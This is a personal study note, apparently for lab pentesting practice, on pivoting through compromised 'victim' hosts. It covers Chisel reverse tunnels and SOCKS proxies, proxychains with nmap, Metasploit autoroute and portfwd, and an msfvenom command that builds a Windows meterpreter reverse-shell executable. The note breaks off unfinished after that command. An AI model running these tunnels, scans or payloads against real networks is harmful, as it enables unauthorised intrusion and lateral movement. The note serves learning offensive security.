## Pivoting using Chisel:

![[Pasted image 20250715173638.png]]

**Attacker Machine**:
`./chisel server -p 3333 --reverse`

**Victim-1**:
`./chisel32 client <attacker-ip>:3333 R:4444:<victim-2-ip>:80`
- First it will connect to attacker machine on port 3333.
- Any traffic sent to `attacker-ip:4444` is tunneled **through the victim-1 machine** to **victim-2:80**
- Now you can scan port 80 or in browser you can visit victim-2:80

Here we can do for only one port, like port 80. Doing for more ports we have to use socks5.

---

##### Using Socks5:

**Attacker**:
`./chisel server -p 3333 --reverse --socks5`

`sudo nano /etc/proxychains4.conf`
add `socks5 127.0.0.1 5555` at the end

**Victim-1**:
`./chisel client <attacker-ip>:3333 R:5555:socks`
As chisel has in-built socks client, traffic coming from attacker:5555 will be sent to socks proxy. Used to connect to victim-2

Now from attacker machine we can scan victim-2. Like we can use proxychains and nmap together.

---
##### Scenario 2:

![[Pasted image 20250715193030.png]]

**While specifying IP, make sure the specifying IP is in same subnet for both machines. Cuz machine has 2 interface(2 IPs)**.

**Victim-1:**
`./chisel server -p 2222 --reverse`
After running attacker part below, come here and run below cmd.
`./chisel client <attacker-ip>:3333 R:1111:127.0.0.1:5555`

**Victim-2**:
`./chisel client <victim-1-ip>:2222 R:5555:<victim-3-ip>:80`

**Attacker**:
`./chisel server -p 3333 --reverse`

**Execution Flow**:
- Attacker opens the browser and entered the url as 127.0.0.1:1111
- Now the data from attacker machine is sent to Victim-1:5555
- Now the data from victim-1:5555 is sent to Victim-3:80 via victim-2.
- Now the attacker will receive the response from victim-3 in the browser.

---

##### Scenario 2 using SOCKS:

![[Pasted image 20250715193030.png]]

**Attacker**:
`./chisel server -p 3333 --reverse`

`sudo nano /etc/proxychains4.conf`
add `socks5 127.0.0.1 5555` at the end and
add `socks5 127.0.0.1 1111` at the end

**Victim-1:**
`./chisel server -p 2222 --socks5`
`./chisel client <attacker-ip>:3333 R:1111:socks`


**Victim-2**:
`./chisel client <victim-1-ip>:2222 R:5555:socks`


**Now you can scan victim-3 from the attacker machine**.
`proxychains nmap -p80,21 <victim-3-ip>`

---

### Reverse Relay with MSF

**Attacker**:
- Gain meterpreter access to victim-1.
- Now use this `multi/manage/autoroute` to create a new route
- set session, subnet and netmask. 
- Run this and the route will be added.
- Now you can do portscan using msf module.
- `meterpreter> portfwd add -R -L <attacker-ip> -l 1337 -p 6666`
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<victim-2-ip> LPORT=6666 -f exe -o payload.exe`

**Incomplete**

---


